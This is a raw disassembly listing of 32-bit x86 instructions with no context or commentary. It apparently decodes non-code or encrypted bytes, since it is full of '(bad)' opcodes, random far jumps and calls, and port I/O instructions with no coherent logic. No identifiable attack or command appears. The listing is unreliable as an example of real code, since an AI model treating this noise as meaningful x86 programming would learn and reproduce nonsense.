  4070b4:	pop    esi
  4070b5:	clc    
  4070b6:	(bad)  
  4070b7:	xor    al,BYTE PTR [edi+0x50a2a1f2]
  4070bd:	cs pop ds
  4070bf:	ficom  WORD PTR [ecx+0x755fb4ee]
  4070c5:	inc    ebp
  4070c6:	shl    DWORD PTR [ecx],1
  4070c8:	mov    eax,0x465c2957
  4070cd:	punpcklwd mm6,DWORD PTR [ebp-0x39]
  4070d1:	and    ebp,DWORD PTR [esi+0x5f6ac47d]
  4070d7:	dec    esi
  4070d8:	test   DWORD PTR [edx],0xb1dd9c9a
  4070de:	jl     0x4070d5
  4070e0:	mov    ecx,0xac5860f5
  4070e5:	xchg   ebp,eax
  4070e6:	mov    ebx,0x84930c5e
  4070eb:	pusha  
  4070ec:	int    0xef
  4070ee:	(bad)  
  4070ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f1:	scas   al,BYTE PTR es:[edi]
  4070f2:	fistp  QWORD PTR [eax+eax*2]
  4070f5:	das    
  4070f6:	ror    BYTE PTR [esi-0x3bc5071c],cl
  4070fc:	or     al,0x47
  4070fe:	ret    0xc0b5
  407101:	pop    ebx
  407102:	jae    0x4070d6
  407104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407105:	aad    0x4d
  407107:	bound  edx,QWORD PTR [eax]
  407109:	repz or dh,ch
  40710c:	add    al,0x22
  40710e:	pop    esi
  40710f:	fxch   st(4)
  407111:	(bad)  
  407112:	jmp    0x41a4:0x27b84909
  407119:	add    ah,BYTE PTR [eax-0x13]
  40711c:	jle    0x407193
  40711e:	es pusha 
  407120:	mov    esp,0xfa736cb8
  407125:	mov    eax,ds:0xf0d48e6b
  40712a:	jle    0x40714f
  40712c:	push   0x34
  40712e:	hlt    
  40712f:	sbb    eax,0xea145c32
  407134:	les    esp,FWORD PTR [edi]
  407136:	leave  
  407137:	fld1   
  407139:	jo     0x407149
  40713b:	fdiv   DWORD PTR [edi+0x28]
  40713e:	pop    esp
  40713f:	sbb    edx,esp
  407141:	pusha  
  407142:	pop    ds
  407143:	stos   BYTE PTR es:[edi],al
  407144:	mov    cs:0x87d243de,al
  40714a:	jmp    DWORD PTR [edx-0x15b2e49f]
  407150:	inc    esp
  407151:	popfw  
  407153:	scas   al,BYTE PTR es:[edi]
  407154:	mov    gs,WORD PTR [edx]
  407156:	dec    eax
  407157:	arpl   bx,sp
  407159:	ins    DWORD PTR es:[edi],dx
  40715a:	and    edx,eax
  40715c:	imul   edi,esp,0x4c
  40715f:	jle    0x407136
  407161:	leave  
  407162:	and    DWORD PTR [ecx],ecx
  407164:	test   DWORD PTR [ecx],0xd8cf3dfb
  40716a:	push   ds
  40716b:	dec    esp
  40716c:	pop    ebx
  40716d:	nop
  40716e:	imul   edx,DWORD PTR [ecx-0x79],0xffffffb9
  407172:	mov    ds:0x275e038a,al
  407177:	cmp    ch,BYTE PTR [ebx+0x3f817e71]
  40717d:	inc    edi
  40717e:	mov    bh,0xe3
  407180:	mov    bh,cl
  407182:	sub    edi,esp
  407184:	popa   
  407185:	mov    ah,0x4d
  407187:	sub    eax,DWORD PTR [edi+edi*2]
  40718a:	or     DWORD PTR [edi-0x59],esi
  40718d:	lock and edi,eax
  407190:	xor    eax,0xedf8daa9
  407195:	pop    ecx
  407196:	xor    eax,0xb9f4380d
  40719b:	(bad)  
  40719c:	xor    al,BYTE PTR [ecx+0x3]
  40719f:	lods   eax,DWORD PTR ds:[esi]
  4071a0:	fwait
  4071a1:	out    dx,eax
  4071a2:	xor    DWORD PTR [edi+0x4547c8cc],edx
  4071a8:	(bad)  
  4071a9:	mov    esp,0xa2d0d55
  4071ae:	jno    0x407131
  4071b0:	lahf   
  4071b1:	in     al,0xab
  4071b3:	scas   eax,DWORD PTR es:[edi]
  4071b4:	and    BYTE PTR [edx+0x6f2f3b96],0x63
  4071bb:	mov    eax,0xc4ac6bf0
  4071c0:	call   0x1189:0x5cf88e3b
  4071c7:	out    dx,eax
  4071c8:	dec    edi
  4071c9:	mov    ebx,0x3dba0399
  4071ce:	push   esp
  4071cf:	pop    ss
  4071d0:	imul   ebp,esi,0x8ba68148
  4071d6:	out    dx,eax
  4071d7:	cmp    al,0x6c
  4071d9:	cmp    DWORD PTR [edx-0x7e],ebx
  4071dc:	mov    ch,0xe
  4071de:	fcom   QWORD PTR [esi+edx*1+0x51]
  4071e2:	xchg   ch,bh
  4071e4:	bnd js 0x40725b
  4071e7:	(bad)  
  4071e8:	rcr    DWORD PTR [ebp-0x29],1
  4071eb:	stc    
  4071ec:	pop    esp
  4071ed:	fld    QWORD PTR [eax]
  4071ef:	xchg   ebx,eax
  4071f0:	sub    al,0xbb
  4071f2:	xchg   DWORD PTR [esi+esi*1-0x70],esi
  4071f6:	popf   
  4071f7:	or     al,0xd
  4071f9:	cld    
  4071fa:	mov    BYTE PTR [ebx+0x779702fa],dh
  407200:	sbb    BYTE PTR [eax+0x6de4e97d],cl
  407206:	sti    
  407207:	sahf   
  407208:	push   esp
  407209:	test   cl,bh
  40720b:	retf   0x28b1
  40720e:	stos   DWORD PTR es:[edi],eax
  40720f:	rol    edx,1
  407211:	mov    cl,0x88
  407213:	push   ebp
  407214:	lock push eax
  407216:	daa    
  407217:	add    BYTE PTR [ecx+esi*2],bh
  40721a:	mov    bl,0xef
  40721c:	mov    gs,WORD PTR [ecx]
  40721e:	aaa    
  40721f:	(bad)  
  407220:	xchg   ebp,eax
  407221:	push   0x4f53870a
  407226:	xor    esi,esp
  407228:	mov    edx,0x61788280
  40722d:	mov    bl,0x20
  40722f:	mov    dh,ah
  407231:	outs   dx,DWORD PTR ds:[esi]
  407232:	adc    esi,DWORD PTR [eax+eax*4]
  407235:	js     0x40724e
  407237:	sbb    DWORD PTR [ecx+esi*4-0x2fba5709],edx
  40723e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723f:	out    0x80,eax
  407241:	aas    
  407242:	es fwait
  407244:	xchg   ecx,eax
  407245:	push   ebp
  407246:	jg     0x4071fe
  407248:	cmp    bh,BYTE PTR [esi-0x64]
  40724b:	xor    ch,dl
  40724d:	or     eax,DWORD PTR [edi+eax*8+0x1fd50a55]
  407254:	cmp    esp,DWORD PTR [edx]
  407256:	mov    ah,0x16
  407258:	push   edx
  407259:	mov    al,ss:0xc252e114
  40725f:	outs   dx,BYTE PTR ds:[esi]
  407260:	push   ds
  407261:	mov    BYTE PTR [esp+ecx*2-0x46],ch
  407265:	pop    edi
  407266:	out    0x59,eax
  407268:	xor    ebp,DWORD PTR [edi+0x6b90962d]
  40726e:	test   al,0xdf
  407270:	fucom  st(0)
  407272:	inc    ecx
  407273:	std    
  407274:	mov    ah,0x69
  407276:	cld    
  407277:	test   DWORD PTR [eax],ebp
  407279:	(bad)  
  40727a:	adc    bh,cl
  40727c:	mov    dh,0x94
  40727e:	sub    esp,DWORD PTR [edi+0x38]
  407281:	mov    esi,esp
  407283:	fwait
  407284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407285:	jno    0x407246
  407287:	jb     0x4072c7
  407289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40728a:	adc    ecx,edx
  40728c:	adc    cl,dh
  40728e:	push   0x2a
  407290:	push   0x11
  407292:	lods   al,BYTE PTR ds:[esi]
  407293:	fstp   DWORD PTR [esi-0xa]
  407296:	mov    edi,0xe875ff74
  40729b:	icebp  
  40729c:	cmp    ebx,DWORD PTR [ebx-0x7f]
  40729f:	(bad)  
  4072a0:	fwait
  4072a1:	and    esp,eax
  4072a3:	daa    
  4072a4:	xor    ecx,esp
  4072a6:	sbb    al,0xed
  4072a8:	(bad)  
  4072a9:	cld    
  4072aa:	iret   
  4072ab:	add    WORD PTR [edi-0x2bf99553],si
  4072b2:	and    edi,ebp
  4072b4:	pop    esi
  4072b5:	sbb    edx,ebp
  4072b7:	jae    0x4072fd
  4072b9:	stc    
  4072ba:	mul    DWORD PTR [ebx-0x2a90b6d7]
  4072c0:	out    0x4d,al
  4072c2:	mov    ch,0x3c
  4072c4:	mov    bl,0x5d
  4072c6:	dec    esi
  4072c7:	bound  esi,QWORD PTR [esi-0x343665f0]
  4072cd:	inc    esi
  4072ce:	sbb    BYTE PTR [ecx],0xdb
  4072d1:	mov    ah,0x20
  4072d3:	stos   DWORD PTR es:[edi],eax
  4072d4:	retf   0xea8
  4072d7:	into   
  4072d8:	inc    esi
  4072d9:	xchg   esp,eax
  4072da:	mov    al,BYTE PTR [ebx+0x59]
  4072dd:	stos   BYTE PTR es:[edi],al
  4072de:	leave  
  4072df:	fnstenv [esi+0x3ccb168f]
  4072e5:	jmp    0x5f27:0xe233cd58
  4072ec:	xchg   edx,eax
  4072ed:	mov    es,ecx
  4072ef:	adc    eax,0xaf964fdf
  4072f4:	loope  0x407305
  4072f6:	inc    edi
  4072f7:	push   ss
  4072f8:	in     al,0x19
  4072fa:	pop    edx
  4072fb:	ret    0x460d
  4072fe:	ss pop ecx
  407300:	lods   eax,DWORD PTR ds:[esi]
  407301:	dec    ebp
  407302:	outs   dx,BYTE PTR ds:[esi]
  407303:	(bad)  
  407304:	out    0xb,al
  407306:	jle    0x407387
  407308:	dec    ebp
  407309:	sub    esp,ecx
  40730b:	outs   dx,DWORD PTR ds:[esi]
  40730c:	ds pusha 
  40730e:	mov    WORD PTR [edx+0x1c],gs
  407311:	xchg   esp,eax
  407312:	cmp    edi,0xc7defe17
  407318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407319:	fs xor eax,0x1bce8131
  40731f:	lods   al,BYTE PTR ds:[esi]
  407320:	dec    ebx
  407321:	loopne 0x4073a1
  407323:	xlat   BYTE PTR ds:[ebx]
  407325:	xor    DWORD PTR [edx],eax
  407327:	and    eax,0xbbe47f07
  40732c:	jo     0x4073ac
  40732e:	sbb    eax,DWORD PTR [esi]
  407330:	inc    esp
  407331:	and    al,0x5d
  407333:	xchg   esp,eax
  407334:	es jne 0x407337
  407337:	adc    cl,ch
  407339:	test   BYTE PTR [ecx+0x238964be],ah
  40733f:	mov    ds:0x251d5abf,al
  407344:	nop
  407345:	and    eax,0x45f350cc
  40734a:	xor    al,0x4c
  40734c:	cmc    
  40734d:	adc    BYTE PTR [edi+0x3c],0x44
  407351:	and    al,BYTE PTR [ecx-0x5eb91dda]
  407357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407358:	outs   dx,BYTE PTR ds:[esi]
  407359:	add    DWORD PTR [ebx],edi
  40735b:	repnz sti 
  40735d:	mov    ?,esp
  40735f:	imul   edi,DWORD PTR [ecx],0xfffffff7
  407362:	jl     0x4073d4
  407364:	in     eax,0xf1
  407366:	scas   eax,DWORD PTR es:[edi]
  407367:	mov    esp,0x74203049
  40736c:	jmp    0x407322
  40736e:	sbb    edi,DWORD PTR [eax-0xc]
  407371:	push   0xfd1241d0
  407376:	mov    bl,0xbd
  407378:	not    dh
  40737a:	sbb    edi,DWORD PTR [ecx+0x6d]
  40737d:	add    al,0x1d
  40737f:	icebp  
  407380:	jp     0x407335
  407382:	jne    0x407387
  407384:	xor    al,0xe3
  407386:	push   cs
  407387:	idiv   BYTE PTR [ecx]
  407389:	xor    BYTE PTR [edx-0x27],dh
  40738c:	icebp  
  40738d:	jbe    0x4073de
  40738f:	jo     0x4073f6
  407391:	and    edi,DWORD PTR [edx-0x2fb9971e]
  407397:	pop    ebp
  407398:	int    0x13
  40739a:	in     eax,dx
  40739b:	push   esi
  40739c:	sbb    BYTE PTR [ebx],cl
  40739e:	sub    al,BYTE PTR [ecx-0x11]
  4073a1:	inc    edi
  4073a2:	sti    
  4073a3:	jne    0x4073e2
  4073a5:	jns    0x407373
  4073a7:	sbb    dh,BYTE PTR [edx]
  4073a9:	mov    dh,0xa9
  4073ab:	inc    esp
  4073ac:	dec    edi
  4073ad:	daa    
  4073ae:	sbb    esp,DWORD PTR [edi]
  4073b0:	push   ds
  4073b1:	jo     0x40739f
  4073b3:	fistp  DWORD PTR [edi]
  4073b5:	jmp    0x407384
  4073b7:	outs   dx,DWORD PTR ds:[esi]
  4073b8:	adc    DWORD PTR [esi-0x4e],0xd6f5cd84
  4073bf:	xor    dh,BYTE PTR [edx-0x2]
  4073c2:	cmp    eax,0x88592220
  4073c7:	mov    ecx,DWORD PTR [eax-0x4c8072dd]
  4073cd:	cmp    BYTE PTR [edx],cl
  4073cf:	jmp    0x1c7c:0x792eca1e
  4073d6:	jmp    0xc6e8:0x4b35c496
  4073dd:	add    al,0x40
  4073df:	in     al,0x87
  4073e1:	stos   DWORD PTR es:[edi],eax
  4073e2:	pop    es
  4073e3:	fidiv  DWORD PTR [ecx]
  4073e5:	cdq    
  4073e6:	and    eax,0xa094eead
  4073eb:	xor    eax,0xe8f7a532
  4073f0:	arpl   si,dx
  4073f2:	ffree  st(5)
  4073f4:	test   BYTE PTR [ebp+0x37],bl
  4073f7:	inc    eax
  4073f8:	cmp    DWORD PTR [ecx],ecx
  4073fa:	dec    edx
  4073fb:	pop    ecx
  4073fc:	retf   
  4073fd:	sti    
  4073fe:	test   eax,0xbe949624
  407403:	repnz push ebp
  407405:	xchg   edx,eax
  407406:	sbb    al,0x93
  407408:	(bad)  
  407409:	push   ebx
  40740a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740b:	pop    ebx
  40740c:	jnp    0x40742c
  40740e:	sbb    DWORD PTR [edi+0x3212e87b],esi
  407414:	cs call 0x51e430ac
  40741a:	cwde   
  40741b:	xor    DWORD PTR [edx],ebx
  40741d:	imul   esp,edx,0xe5ff8856
  407423:	add    BYTE PTR [ecx+eax*1-0x68],ch
  407427:	mov    dl,0x85
  407429:	retf   0x1366
  40742c:	lods   eax,DWORD PTR ds:[esi]
  40742d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40742e:	test   BYTE PTR [edx+0x53],bh
  407431:	push   edx
  407432:	adc    eax,0xc21eb267
  407437:	and    eax,0xf4518e96
  40743c:	ret    0xa66e
  40743f:	je     0x407490
  407441:	out    dx,eax
  407442:	mov    eax,DWORD PTR [ebx]
  407444:	add    al,0x87
  407446:	dec    esi
  407447:	inc    ecx
  407448:	sbb    edi,ebx
  40744a:	jne    0x40742e
  40744c:	nop
  40744d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40744e:	call   0x4d2d:0xe0a85a0
  407455:	mov    edx,DWORD PTR [esi-0x51]
  407458:	scas   al,BYTE PTR es:[edi]
  407459:	dec    eax
  40745a:	inc    ecx
  40745b:	inc    ebp
  40745c:	jecxz  0x407469
  40745e:	(bad)  
  40745f:	ds leave 
  407461:	dec    esp
  407462:	aad    0xca
  407464:	sub    esi,DWORD PTR [ebx-0x7204c8e2]
  40746a:	stos   BYTE PTR es:[edi],al
  40746b:	sbb    al,0x19
  40746d:	mov    esi,0x9dc06265
  407472:	ins    BYTE PTR es:[edi],dx
  407473:	cli    
  407474:	nop
  407475:	mov    ebx,0x5944db80
  40747a:	cdq    
  40747b:	mov    esi,0x74bccbb1
  407480:	ror    bl,0x31
  407483:	lock div DWORD PTR [esi]
  407486:	mov    edi,0xd5076598
  40748b:	xlat   BYTE PTR ds:[ebx]
  40748c:	xor    BYTE PTR [esi+0x19bc5b1],dh
  407492:	mov    al,0x8a
  407494:	pusha  
  407495:	mov    ecx,0xfcc745e3
  40749a:	idiv   BYTE PTR [esi-0x405e47bb]
  4074a0:	pushf  
  4074a1:	adc    ebx,DWORD PTR [ebp-0x7d05ad3f]
  4074a7:	popf   
  4074a8:	jo     0x4074db
  4074aa:	xchg   ecx,eax
  4074ab:	or     al,0x41
  4074ad:	jmp    0x5fc0:0x3a21cf8b
  4074b4:	inc    ecx
  4074b5:	outs   dx,BYTE PTR ds:[esi]
  4074b6:	mov    ch,0xf4
  4074b8:	mov    DWORD PTR [ebp-0x33248e2e],ecx
  4074be:	jl     0x407518
  4074c0:	sbb    DWORD PTR [ebx+0x6924ae6c],ebx
  4074c6:	jne    0x40752f
  4074c8:	pop    ebx
  4074c9:	popf   
  4074ca:	jle    0x407530
  4074cc:	push   ecx
  4074cd:	jmp    0x407513
  4074cf:	jo     0x407518
  4074d1:	add    esp,DWORD PTR [eax+eiz*2]
  4074d4:	sti    
  4074d5:	fprem  
  4074d7:	xor    ebx,DWORD PTR ds:0xad7a78cf
  4074dd:	cs push edi
  4074df:	out    dx,eax
  4074e0:	(bad)  
  4074e1:	fild   WORD PTR [edi+eax*8+0x5]
  4074e5:	sbb    DWORD PTR [ebx-0x260eebe],edx
  4074eb:	arpl   WORD PTR [edi],di
  4074ed:	stos   BYTE PTR es:[edi],al
  4074ee:	in     al,dx
  4074ef:	std    
  4074f0:	adc    ebp,0x374ca420
  4074f6:	imul   eax,DWORD PTR [eax+esi*8-0x19ba792c],0x143eb4d8
  407501:	aad    0x7d
  407503:	aas    
  407504:	inc    ebx
  407505:	cmp    BYTE PTR [esi],bl
  407507:	mov    ebx,0x28a20988
  40750c:	sub    al,dl
  40750e:	add    esi,DWORD PTR ds:0x38d52a09
  407514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407515:	or     ch,al
  407517:	je     0x40758d
  407519:	dec    eax
  40751a:	dec    edx
  40751b:	xchg   ebx,eax
  40751c:	or     ecx,esp
  40751e:	push   cs
  40751f:	add    edi,esi
  407521:	xlat   BYTE PTR ds:[ebx]
  407522:	mov    bl,0x64
  407524:	int3   
  407525:	mov    esp,0x7a54a520
  40752a:	mov    esi,0xb487eb8f
  40752f:	popf   
  407530:	push   0x63
  407532:	out    dx,eax
  407533:	inc    ebx
  407534:	pop    ecx
  407535:	push   ss
  407536:	scas   al,BYTE PTR es:[edi]
  407537:	and    esp,DWORD PTR [edx+0x71]
  40753a:	or     DWORD PTR [edx],0x7c
  40753d:	js     0x407521
  40753f:	and    BYTE PTR [edi],0x13
  407542:	add    DWORD PTR gs:0x3188fba7,0xffffffc7
  40754a:	js     0x40758d
  40754c:	pop    eax
  40754d:	add    al,0x66
  40754f:	cs push edx
  407551:	mov    esp,0xb5a90bd3
  407556:	sti    
  407557:	sub    esi,DWORD PTR [esi+0xbc2ff8c]
  40755d:	or     eax,0xdc026daa
  407562:	mov    edi,0xbe459d36
  407567:	mov    ebx,0xa508a652
  40756c:	mov    ch,0xcf
  40756e:	test   DWORD PTR [ebp+0x3a],esp
  407571:	retf   0xe55
  407574:	call   0x4a4652bb
  407579:	and    esp,DWORD PTR [eax+0x259fd061]
  40757f:	inc    esp
  407580:	sub    BYTE PTR [edx],cl
  407582:	mov    dh,0xb5
  407584:	and    dl,BYTE PTR [ecx]
  407586:	inc    ebx
  407587:	iret   
  407588:	shr    DWORD PTR [ebx+ebp*4],0xb2
  40758c:	push   0xf5d710fc
  407591:	mov    edi,0x628aaa37
  407596:	cs mov eax,0xd48488d4
  40759c:	in     eax,dx
  40759d:	in     eax,dx
  40759e:	arpl   WORD PTR [ebp+0x9],bx
  4075a1:	push   ds
  4075a2:	jp     0x407554
  4075a4:	fldenv [edx+0xd]
  4075a7:	es xchg esp,eax
  4075a9:	cmc    
  4075aa:	mov    ebx,0x55b1d0a0
  4075af:	les    ebx,FWORD PTR [ebx-0x51]
  4075b2:	icebp  
  4075b3:	outs   dx,BYTE PTR ds:[esi]
  4075b4:	aam    0x8b
  4075b6:	mov    ds,WORD PTR [edx+0x65]
  4075b9:	xor    edx,DWORD PTR [edi]
  4075bb:	dec    edi
  4075bc:	rcr    esp,cl
  4075be:	pop    ebp
  4075bf:	pop    es
  4075c0:	out    dx,al
  4075c1:	sbb    eax,0x6e3bfaba
  4075c6:	cmp    al,0xe8
  4075c8:	stos   DWORD PTR es:[edi],eax
  4075c9:	jb     0x4075c7
  4075cb:	aad    0xc
  4075cd:	addr16 ror bl,0xcd
  4075d1:	jmp    0x2633:0x591c1e74
  4075d8:	dec    edx
  4075d9:	mov    esi,0x15968d06
  4075de:	adc    BYTE PTR [ecx],0xa3
  4075e1:	adc    DWORD PTR [ebx-0x18],eax
  4075e4:	mov    esi,0xaf3b02f
  4075e9:	pop    edi
  4075ea:	test   al,0x94
  4075ec:	js     0x407594
  4075ee:	sbb    bh,BYTE PTR [esi-0x1db7da00]
  4075f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075f5:	(bad)  
  4075f6:	popf   
  4075f7:	cmp    DWORD PTR [ebp-0x5463fef1],eax
  4075fd:	sub    eax,0xf07e595
  407602:	cmp    al,0x29
  407604:	sahf   
  407605:	cmp    al,0x23
  407607:	ror    ecx,cl
  407609:	mov    al,0x25
  40760b:	call   0x1ecf:0xfb18738e
  407612:	mov    ds:0x5a85749,eax
  407617:	test   BYTE PTR [esi-0x7a],0x84
  40761b:	jg     0x407652
  40761d:	mov    esi,DWORD PTR [ecx]
  40761f:	ins    DWORD PTR es:[edi],dx
  407620:	js     0x4075ec
  407622:	xor    al,0x72
  407624:	cmc    
  407625:	or     ch,ch
  407627:	stos   DWORD PTR es:[edi],eax
  407628:	mov    al,ds:0xe9254224
  40762d:	js     0x407627
  40762f:	stc    
  407630:	xchg   esp,edi
  407632:	in     al,0xd1
  407634:	cmc    
  407635:	ds scas al,BYTE PTR es:[edi]
  407637:	or     BYTE PTR [esi],dl
  407639:	jmp    0xe904:0xaf864cb5
  407640:	sub    al,0xf5
  407642:	sub    BYTE PTR [eax+esi*1-0x53],0x85
  407647:	or     al,0x8
  407649:	jo     0x4076c3
  40764b:	cmp    DWORD PTR [edi+0x69c83b79],ebx
  407651:	retf   0x88b1
  407654:	inc    eax
  407655:	add    DWORD PTR [eax+0x3b],ebp
  407658:	ins    DWORD PTR es:[edi],dx
  407659:	nop
  40765a:	cmp    eax,0x5f873ac7
  40765f:	jge    0x4076d7
  407661:	enter  0x6c2e,0x9b
  407665:	ret    0x7fec
  407668:	inc    esi
  407669:	mov    WORD PTR [esi+eax*8],?
  40766c:	ds popf 
  40766e:	or     esi,esi
  407670:	mov    ch,0xac
  407672:	pop    esi
  407673:	lock int3 
  407675:	or     eax,0xb12993ad
  40767a:	add    BYTE PTR [esi-0x414b413d],dh
  407680:	fistp  QWORD PTR [edx+0x7683f7d4]
  407686:	push   ebp
  407687:	dec    ecx
  407688:	dec    ebx
  407689:	push   ebx
  40768a:	xor    DWORD PTR [ebp-0x50],0xfffffff7
  40768e:	aam    0x90
  407690:	fistp  WORD PTR [edx-0x7d8cb93f]
  407696:	(bad)  [ecx+ebx*8]
  407699:	pop    esi
  40769a:	addr16 daa 
  40769c:	addr16 pop edx
  40769e:	fwait
  40769f:	(bad)  
  4076a0:	xlat   BYTE PTR ds:[ebx]
  4076a1:	lea    esi,[esi-0x34]
  4076a4:	test   DWORD PTR [esp+eax*8],0xb39bc651
  4076ab:	retf   
  4076ac:	jno    0x4076e4
  4076ae:	sar    DWORD PTR [ecx*8-0x19c10be2],0x9b
  4076b6:	push   ds
  4076b7:	cdq    
  4076b8:	mov    edi,0x8589f754
  4076bd:	cld    
  4076be:	cmp    DWORD PTR [ecx+0x3d],0x3e939bca
  4076c5:	int    0xa5
  4076c7:	call   0xa8939c3f
  4076cc:	mov    ecx,0xb1b49d31
  4076d1:	add    eax,0x7620dc88
  4076d6:	or     edx,ebx
  4076d8:	sub    eax,0x8895b898
  4076dd:	arpl   WORD PTR [esi+ecx*1-0x6b55733a],ax
  4076e4:	imul   esi,DWORD PTR [esi-0x46d977f3],0x78
  4076eb:	pop    esi
  4076ec:	add    edi,DWORD PTR [ebp+0x4a]
  4076ef:	mov    bh,0x21
  4076f1:	cmp    eax,0xb3cd4d84
  4076f6:	pop    ds
  4076f7:	pop    es
  4076f8:	sub    eax,0x487f51f7
  4076fd:	shl    dl,cl
  4076ff:	jno    0x407684
  407701:	adc    cl,ch
  407703:	add    bl,BYTE PTR [edx+0x51]
  407706:	or     BYTE PTR [eax-0x35],al
  407709:	bound  ebp,QWORD PTR [eax+eax*1-0x203a75c8]
  407710:	and    DWORD PTR [edx-0x1f],0x55
  407714:	xchg   ebx,eax
  407716:	dec    edi
  407717:	inc    ebp
  407718:	(bad)  
  407719:	cs or  eax,0xc55f6c41
  40771f:	push   ds
  407720:	hlt    
  407721:	cwde   
  407722:	cmovns ebp,DWORD PTR [edi-0x18752765]
  407729:	adc    al,cl
  40772b:	ds push edx
  40772d:	rcl    DWORD PTR [ecx+edx*8+0x2f],cl
  407731:	pushf  
  407732:	repnz sbb esp,esp
  407735:	mov    eax,ds:0x2cafa578
  40773a:	xchg   esi,eax
  40773b:	test   DWORD PTR [edx],eax
  40773d:	add    ebx,DWORD PTR [eax-0x5b]
  407740:	arpl   WORD PTR [esi+0x28],ax
  407743:	xchg   ebx,eax
  407744:	stc    
  407745:	ja     0x407775
  407747:	xor    DWORD PTR [eax+edi*2],0xa
  40774b:	sar    DWORD PTR [ebp-0x7ca7288d],1
  407751:	test   DWORD PTR [eax],edi
  407753:	jo     0x4077c2
  407755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407756:	xchg   edx,eax
  407757:	ret    0xa7fc
  40775a:	mov    al,0xb3
  40775c:	mov    eax,ds:0xa90a109a
  407761:	lods   eax,DWORD PTR ds:[esi]
  407762:	rcr    edi,0x38
  407765:	xchg   BYTE PTR [esi],dh
  407767:	push   ds
  407768:	push   edx
  407769:	mov    ch,0xa9
  40776b:	or     ah,BYTE PTR [ecx-0x3f]
  40776e:	inc    edi
  40776f:	cld    
  407770:	jno    0x407786
  407772:	cmp    bh,BYTE PTR [edi+0x69]
  407775:	ss jge 0x40776d
  407778:	cmp    eax,0xda681707
  40777d:	inc    esp
  40777e:	dec    ebp
  40777f:	sub    BYTE PTR [edi],bl
  407781:	cmp    al,0x25
  407783:	loope  0x4077d6
  407785:	add    dh,cl
  407787:	in     al,dx
  407788:	ja     0x407751
  40778a:	or     BYTE PTR [ecx+0x2f73f01d],bl
  407790:	outs   dx,BYTE PTR ds:[esi]
  407791:	add    al,0x61
  407793:	inc    ecx
  407794:	fadd   st,st(7)
  407796:	add    DWORD PTR [edx-0x51],edi
  407799:	data16 loope 0x4077b3
  40779c:	popf   
  40779d:	push   edi
  40779e:	fimul  DWORD PTR [ebp+0x532323c5]
  4077a4:	add    eax,0x7ccaa592
  4077a9:	in     al,dx
  4077aa:	cmp    eax,0x276495e6
  4077af:	mov    esi,0xc4b0b259
  4077b4:	xor    eax,0x7d805900
  4077b9:	pop    eax
  4077ba:	leave  
  4077bb:	dec    ebx
  4077bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077bd:	cmp    BYTE PTR ds:0x37fa1b66,dl
  4077c3:	sbb    eax,0x64ce96d4
  4077c8:	popa   
  4077c9:	jle    0x4077ff
  4077cb:	rcr    al,1
  4077cd:	retf   
  4077ce:	add    DWORD PTR [ebp+0x6c],ecx
  4077d1:	push   ecx
  4077d2:	dec    ebp
  4077d3:	cmp    edx,0xffffff8b
  4077d6:	sbb    al,0xe4
  4077d8:	mov    cl,0x96
  4077da:	jo     0x407809
  4077dc:	sub    DWORD PTR [eax],ecx
  4077de:	in     al,0x89
  4077e0:	sub    al,0x31
  4077e2:	jae    0x4077d8
  4077e4:	push   esp
  4077e5:	int3   
  4077e6:	repnz inc ebx
  4077e8:	cmp    eax,0x3bb1ad56
  4077ed:	xor    al,dh
  4077ef:	cmp    al,0x5a
  4077f1:	(bad)  
  4077f2:	sbb    eax,0x167ea07d
  4077f7:	(bad)  
  4077f9:	or     bh,BYTE PTR [edx]
  4077fb:	aaa    
  4077fc:	mov    ch,0xd0
  4077fe:	stos   DWORD PTR es:[edi],eax
  4077ff:	sti    
  407800:	mov    esi,DWORD PTR [ebx]
  407802:	or     BYTE PTR [ecx+0x631c491],bh
  407808:	mov    al,BYTE PTR [ecx]
  40780a:	in     al,dx
  40780b:	jbe    0x4077f0
  40780d:	mov    ch,dh
  40780f:	mov    DWORD PTR [ebp+0x7f410812],ebx
  407815:	stos   BYTE PTR es:[edi],al
  407816:	je     0x4077df
  407818:	push   edi
  407819:	mov    esi,0xa31acd5d
  40781e:	fnsave [ebx]
  407820:	ffreep st(7)
  407822:	xor    ch,dl
  407824:	sub    eax,0xa2841304
  407829:	sub    DWORD PTR [ebx],ebx
  40782b:	lds    eax,FWORD PTR [ecx]
  40782d:	mov    ds:0x525d5bd1,al
  407832:	mov    cl,0xc2
  407834:	mov    ecx,0x2e20b9aa
  407839:	dec    edx
  40783a:	out    0xed,al
  40783c:	mov    eax,cs
  40783e:	inc    ebx
  40783f:	sub    dh,BYTE PTR ds:0xbba910b6
  407845:	aaa    
  407846:	dec    ecx
  407847:	pusha  
  407848:	aam    0x57
  40784a:	rcl    BYTE PTR [edi],0x1d
  40784d:	jp     0x4078cd
  40784f:	mov    esp,0x22a2683
  407854:	fwait
  407855:	int    0xf0
  407857:	inc    ebx
  407858:	inc    esp
  407859:	fadd   QWORD PTR ds:0xc2d13ae6
  40785f:	(bad)  
  407860:	xor    DWORD PTR [ecx-0x319e3bd],0xca9e4b71
  40786a:	inc    edi
  40786b:	xor    cl,cl
  40786d:	test   DWORD PTR [ebx+0x1f73505f],ebp
  407873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407874:	adc    DWORD PTR [edi-0x76],edi
  407877:	(bad)  
  407879:	jo     0x4078af
  40787b:	fisttp DWORD PTR [eax-0xe]
  40787e:	dec    eax
  40787f:	jmp    0x9c63:0xd2ef3131
  407886:	add    eax,0xbcd15a7d
  40788b:	sar    BYTE PTR [ecx+0x70923c3],cl
  407891:	sbb    BYTE PTR [esi+0x1e18217],0x28
  407898:	cwde   
  407899:	sub    cl,BYTE PTR [edi]
  40789b:	loopne 0x4078d2
  40789d:	call   0x53e4fbb2
  4078a2:	test   ebp,eax
